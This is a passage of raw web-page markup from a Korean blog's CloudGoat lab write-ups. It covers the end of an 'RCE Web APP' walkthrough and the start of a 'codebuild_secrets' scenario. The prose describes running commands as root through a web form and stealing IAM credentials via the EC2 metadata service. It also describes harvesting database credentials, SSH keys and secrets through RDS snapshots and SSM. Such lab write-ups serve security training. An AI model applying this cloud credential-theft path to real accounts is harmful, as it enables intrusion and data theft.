2j46FjaLCYtf99TOe958f/ARK7yOe3+D3iAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/18ec225bba413fe5e58491af517df50a/004a5/18.png\"\n        srcset=\"/static/18ec225bba413fe5e58491af517df50a/e9ff0/18.png 180w,\n/static/18ec225bba413fe5e58491af517df50a/004a5/18.png 329w\"\n        sizes=\"(max-width: 329px) 100vw, 329px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY04WMu0rDYACFsxWKrU0soYltbJteEMc6OEhdfSBzKUkGR0HwIXwBV2ffwcHBUZC2pqnGpv2TfEIUQQc9cDhwblJD66A22tRknZqsISs6NUX/VlU1aLa6GKZJe9DD6Jl0hn1aXRPdHGD0+xjDHo1Om+qOhuR5HrZtc2ZZOI6D6zo4rlN4lmXh+z5B4ON7HhN38tVxCYIA++oa9/yC4f4B1bpGfddAEusVy3BG/BoRhgvm8xeiaMliETGdzVitEv7CRghGx2PKiora3EN6jjY8Ttc8hQlJkiCE+DHI8hyRpqS/KERa5O9v75wenrBVlqkoOtLtA1zewc3950Ge58VJ/g+zLCv6cRxzNBpTKtWpbDf5APNcGtAY7eOSAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/1ea1d42068805090cb63b9eb5d27ef8e/37523/19.png\"\n        srcset=\"/static/1ea1d42068805090cb63b9eb5d27ef8e/e9ff0/19.png 180w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/f21e7/19.png 360w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/37523/19.png 720w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/302a4/19.png 1080w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/07a9c/19.png 1440w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/fba00/19.png 1529w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 URL 쪽으로 이동하게 되면 특정 문자열을 입력할 수있는 공간이 생깁니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlUlEQVQY06XD0QqCMBiA0b10Fz1WN1GPEUQR3aSFZjAt59z+ufkFBd2PDhwVpgk7us/ROdynJ6aUfZ5n1OY0s1jDcgurA39TpTbsKsO5DRQvoXWCdkLr808poZ7jSNUbtAQeTqjtd2V93sEjMaGa54P99UjR3bjokkKXlN2N2jbU9p5VoqAkBXoZeHnz2/sBE2z2mCJvG03OD0xKYcAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/25be06c714ccc4a892f65a0610573c81/37523/20.png\"\n        srcset=\"/static/25be06c714ccc4a892f65a0610573c81/e9ff0/20.png 180w,\n/static/25be06c714ccc4a892f65a0610573c81/f21e7/20.png 360w,\n/static/25be06c714ccc4a892f65a0610573c81/37523/20.png 720w,\n/static/25be06c714ccc4a892f65a0610573c81/302a4/20.png 1080w,\n/static/25be06c714ccc4a892f65a0610573c81/2eb79/20.png 1256w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>오 커맨드를 입력하라는 곳에 커맨드를 입력해보면 리눅스 명령이 실행되고 이는 리눅스 서버라는 사실을 알 수 있으며 현재 돌아가는 데몬은 root권한인 것도 알 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqUlEQVQY06WL2w2CMBSGO6xxEydwD+MIvrmChjvEitDaFqSQ0PqbUECij5zky3/LIcYY9MbCWAsz6QrI/gxsj8DmAOxOgH1j1RHvLnHJG8TSIlM9dG9WQVIucC0YqG6RvTSiqkX4i9L/3Yx2+wi5sRwpo+CtAtMSXAvwWScvF91ia1wWXQXRqQHyaBh8Fg8EPIFfRmOOZh88k2/HYnil27wiHH7Smjoqig+aNspjptgFugAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/d6cbe7d9c441701cdbd4c7c04e9ef020/37523/21.png\"\n        srcset=\"/static/d6cbe7d9c441701cdbd4c7c04e9ef020/e9ff0/21.png 180w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/f21e7/21.png 360w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/37523/21.png 720w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/620ae/21.png 1043w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 리눅스 명령이 실행이 가능하기 때문에 RCE 취약점에 대해 트리거를 할 수있으며 <code class=\"language-text\">uname -a</code> 명령을 통해서 서버의 세부 정보를 확인할 수 가 있 습니다.</li>\n<li>EC2 인스턴스의 애플리케이션에서 RCE 를 발견한 경우 가장 가치가 있는 작업은 IMDS를 사용하여 IAM 자격 증명을 훔치는 것입니다.</li>\n<li>IAM Credential 외에 인스턴스 Metadata 를 사용해서 EC2 인스턴스를 시작할 때 지정된 사용자 데이터에 액세스를 할 수있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABKklEQVQoz5XP226CQBAGYN7/odrUA6gchV0FObWC1SoiRlsQlv4NE5tae9WLLzP/bGaSlWoh4L3tEe6PCLMjgl2BICsoL0/lv9RtC6kRAtFmhe25QFF/4HB5/6s6I/9W3vR3RHewFjWUWEPfH0Nb2TDWzhWDuWHUT7cz2Ls5nMwFyz04+477W+aiFBWkum0wfjbxyId4nMnkgQ0oP7kKGQQqeu4Iw0DFKDagJlPoKwdaYlPtspbaKMXl52DPG0GJdMihhoGv0nLXd7NOfzGhGQk1yJFOe+aaw3hl9KOyqSA1nw2UWIcc67C2c7DcBy8Cquzgg+ULwg8+uZ3dq9oLpLKuMIlMyJ4K/WUKLbYoG0sHZsJgpRzO2qVqJRxWOrtWTu/m8iplOJVnfAFRRPs2UEoWngAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/b9d677c108554b6ffe230396c8f95eb5/37523/22.png\"\n        srcset=\"/static/b9d677c108554b6ffe230396c8f95eb5/e9ff0/22.png 180w,\n/static/b9d677c108554b6ffe230396c8f95eb5/f21e7/22.png 360w,\n/static/b9d677c108554b6ffe230396c8f95eb5/37523/22.png 720w,\n/static/b9d677c108554b6ffe230396c8f95eb5/302a4/22.png 1080w,\n/static/b9d677c108554b6ffe230396c8f95eb5/cd138/22.png 1220w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 EC2의 사용자 데이터에는 EC2 인스턴스에서 RDS 인스턴스에 연결하기 위한 명령들이 포함되어 있습니다</li>\n<li>해당 명령에서는 RDS 인스턴스에 대한 Credential, Endpoint가 포함되어 있고 해당 파일은 RDS 인스턴스에 저장된 비밀정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#rds-amazon-relational-database-service\">RDS (Amazon Relational Database Service)</a></li>\n<li><a href=\"#iam-user-mcduck-%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%82%98%EC%97%B4\">IAM User: McDuck 접근 가능한 정책 나열</a></li>\n<li><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%95%98%EB%93%9C-%EC%BD%94%EB%94%A9%EB%90%9C-ssh-key-%EC%88%98%EC%A7%91\">S3 Bucket 리스트 분석및 하드 코딩된 SSH key 수집</a></li>\n<li><a href=\"#ssh-%EC%A0%91%EC%86%8D%EC%A0%84-%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95\">SSH 접속전 준비 과정</a></li>\n<li><a href=\"#%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-s3-bucket-%EB%B6%84%EC%84%9D\">접근 가능한 S3 Bucket 분석</a></li>\n<li><a href=\"#rds-instance-%EB%82%98%EC%97%B4-%EB%B0%8F-postgresql-%EC%A0%91%EC%86%8D\">RDS Instance 나열 및 PostgreSQL 접속</a></li>\n<li><a href=\"#lara-iam-user-%ED%97%88%EC%9A%A9%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B6%84%EC%84%9D\">Lara IAM User 허용가능한 정책 분석</a></li>\n<li><a href=\"#elb-%EB%A1%9C%EA%B7%B8-%EC%88%98%EC%A7%91-%EB%B0%8F-%EB%B6%84%EC%84%9D\">ELB 로그 수집 및 분석</a></li>\n<li><a href=\"#%EC%9B%B9-%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98-%EC%A0%91%EA%B7%BC-%EB%B0%8F-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%8A%B8%EB%A6%AC%EA%B1%B0\">웹 애플리케이션 접근 및 RCE 취약점 트리거</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 7 (CloudGoat: RCE Web APP)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-7/"}},"prev":{"id":"fbfbf543-9bb3-5390-bd80-83556a11e30f","html":"<h1 id=\"클라우드-서비스-취약점-분석-8\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-8\" aria-label=\"클라우드 서비스 취약점 분석 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 8</h1>\n<h1 id=\"scenario-7--codebuild_secrets\" style=\"position:relative;\"><a href=\"#scenario-7--codebuild_secrets\" aria-label=\"scenario 7  codebuild_secrets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 7]:  codebuild_secrets</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Large\nDifficulty: Hard\nCommand: $ ./cloudgoat.py create codebuild_secrets</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>CodeBuild Project</li>\n<li>Lambda Function</li>\n<li>VPC(RDS, EC2)</li>\n<li>IAM Users</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User Solo</li>\n<li>SSM 파라미터 데이터 탐색후 Security Database에서 하드코딩된 SSH 키가 저장</li>\n<li>IMDS 취약점</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>RDS Database Storage안에 한 쌍의  Secret Strings을 찾아보자</li>\n<li>Solo IAM 사용자를 이용하여 공격자는 먼저 CodeBuild 프로젝트에 대해 열거를 시작합니다.</li>\n<li>IAM 사용자 <code class=\"language-text\">Calrissian</code> 에 대한 보안이 되지 않은 IAM 키를 찾아 냅니다.</li>\n<li>공격자는 <code class=\"language-text\">Calrissian</code>으로 작동하여 RDS 데이터베이스를 분석합니다.</li>\n<li>데이터베이스의 내용에 직접 접근할 수 었는 공격자는 RDS 스냅샷 기능을 이용하여 secret string을 획득 할 수 있습니다.</li>\n<li>두 번째로는 공격자가 <code class=\"language-text\">SSM</code> 매개 변수를 분석하여 EC2 인스턴스에 대한 SSH키를 찾을 수가 있습니다.</li>\n<li>메타데이터 서비스를 사용하여 공격자는 EC2 인스턴스 프로필의 키를 획득하고 대상 환경에대한 정보를 열거 합니다. 이를 통해서 원래 데이터베이스에서 Secret String을 획득 합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFRElEQVQ4y0VTeUzTZxh+y/n7FXUOOUZ/PTjEAopBxFbKVdpCD6iFQoVySOa9oXIsGxNWytFyWK6KysAd6KawRcWgRqZkupk5s8XMHZlGM5d4MCIKIQKthfZdfuCyL3nyft/7x/M93/M9L4SEhPlERq0X8vlRQYGBgV5MAjwFIsVuYYKqTyhSWqVyXXempqhbqS7olil03cIEpVWYoOoViBT7V/mu8GKzOQSbwyHYbDYNb+DxeMyIyHVrwsMjVrFYlLcHgyZUfiRMUF0ViJTn01V5w9m5bw9v0ZYMKzL1w3RPmKC6IhApzX7+Ad7ckDUkNziMpCiKpCg2CaygQG/Sj+0RrdzLjFVuXx4SI2W+X9UF+fnvQlFxJfT1fQW3frgDo1d/hBMnh6GgYB/o9aVwoKwVVkdtIvnrRczQiLhFMjZFEcAJjSCCALw7EeEUIrxengDgAQBe/+19ADwDl85034ME8AYANwBgAIA7h80iKDabgJUAnvw9AwHKE853Cs5gaXzzlEZlsn+R0eS4lF4/Y5Q3zLUrTI7LaQ22j2XG6f1Ks+OSwvTqnKx2aoe62f6pptVxWWWaa1pGuhEc6i2CVsOIKf09uuz4U2w8/RjT6yfPZVkQt3YiKszzd7d2Op/v7EXM73ItqMyOkcJuRL0VMa3BPlhy1IV7jyPqOhYeAgARzvUlwN0NvMTpzW+2lXWqLfuacwrLbyaLjXONsrrZLqlhandqzeQHMuN0r8QwZUyteV4orZvrkRrnrOLqZzmptTOmlFrbJ6mG6TK2nyfBYrEIuIUIkppxRVoTPpA14Xhao71l2w2Enc8QEBHcEs4O+MguPADB4Ijk4Fir3uq6m9cxfyfT/LJK1+4YLTmy8Jemxd4PwCBCuYEE9CKCzDCRm21xYpbFiRlm+2na7KRc4wr3sO0rlqWPPOTkXEOm9OKMpObZlZJjiEWHXahutvUXHnbad/e5UGuZ/wPAneAH+y55mFR5b0OyYe5YisF2Irn6xTaakBcRz1wdGcuEDf3psPakHsJ7VLF7fxOm1kwWi6sn9Cnv3d+YZphQSwxTemn1mJjNBC+KE0zCGURQGCe0ug7XwtZOF2oP0fKBsTn/mC/95OzWWVVOB57RtuOQ3Phcs210yYosOmJxp/aD6OxZRuLQgMfmz+Im6Aj9ighyw7hK27bwRNfhnM5qnes68BMuWlEwhCBvmLXSF+V1uVDRaDtMk4l2DAdFJe9i+qq+uU1pv0V/9Si6iQazwbKUY0ZSxZ/RyR/NtCXVvOxJqX5RkGac3iOrm62TGad3iQ+OZ0qNM01S4+whcdUTCR3itfLaN+KFsYRH4td6L/Fwl1vieZOn4Cg/A8AdWhY/ZbJAY3FhdhuiwuS4pjnktBcfQVS3OpGbUrdSPYCgvYBgWZokxsWl6hbQigAlCETpkjIqfDNz0Y/UDx8lK82Oayqz42Za3UydvNH2ZUaT46a80T6YVHl/Q1z5mGRTxT9piQd+WRNf8bdAWDkmEZXfj4nbcztSUPE0Q1D+SLax5CJF0GPK4QYT/suBeD23XsTr6kOJmKZXCCrTrKmo24XF3S6UN9h6sizOx7SfW1rmf1Y32z/XdbhQ2+5CRf1UyVFaOUVRBJvDJblcGhyCww0mubxgcn3qzmVGOgENL6v0VifmdTqd8oa5zpy2hXs0yZYWx3VNi61H1+HEnHanQ1n/ouDk/4Q8khvCXwSHF0ZygsNJXngMGeAD3tEaq29I3vehYfrvQmJy+/wi9SOciKIbYev0Q6yI7H5/ftGN0Mii6yGR8vqVAUzw/hcESz1Jl6aXewAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./M33.png\"\n        title=\"./M33.png\"\n        src=\"/static/fd887b8808ff82905cc1591cc08a051f/37523/M33.png\"\n        srcset=\"/static/fd887b8808ff82905cc1591cc08a051f/e9ff0/M33.png 180w,\n/static/fd887b8808ff82905cc1591cc08a051f/f21e7/M33.png 360w,\n/static/fd887b8808ff82905cc1591cc08a051f/37523/M33.png 720w,\n/static/fd887b8808ff82905cc1591cc08a051f/302a4/M33.png 1080w,\n/static/fd887b8808ff82905cc1591cc08a051f/07a9c/M33.png 1440w,\n/static/fd887b8808ff82905cc1591cc08a051f/ccf18/M33.png 2927w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABbElEQVQoz43QvW7TYBjF8TdOmiat69d2/BF/Fmo72NiJQCQxTcvWiSUCNpamVYOEqrJxAb2PLiDEXbAhpF7VH2FgTGA4erafznmE5R1iujGGEyPNAMOOMOwY3QrR7RDNCOjvD1E1n51di1ZbR+kYGyO8cITjpQzsh9hugqZHWE6C643o77t0ugOEIpv8xbahwgtygqjAD3P8qMD1Mob+qMGlETWt/hdrwKKsKcfP+XWLqibLp0yenFKOa47SCdII6asOvT0bpaOjtI3toO2mzbyBk+C4CQMzRpUhUs840FJ6vZhuN6KlDBFC/mm5uamIDgselzPy/ClZVROUx6RJRTULmNQ+47lHNXNJxxLNtBHKPyafn69Yv1vz/nLFmw8fqW5uub54y903h88/dvn0fY8v912+3qu8OHuEEDrtnS3gs+kJs/kp8+kx5eKM4eIlJ/WC5cpieXHA8lLj1ZXK67XkQRYiWubvX24AfwLSqdGD1Zs/JAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/cf528b53df08014b09570ab17a2897e4/37523/0.png\"\n        srcset=\"/static/cf528b53df08014b09570ab17a2897e4/e9ff0/0.png 180w,\n/static/cf528b53df08014b09570ab17a2897e4/f21e7/0.png 360w,\n/static/cf528b53df08014b09570ab17a2897e4/37523/0.png 720w,\n/static/cf528b53df08014b09570ab17a2897e4/302a4/0.png 1080w,\n/static/cf528b53df08014b09570ab17a2897e4/21b4d/0.png 1280w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      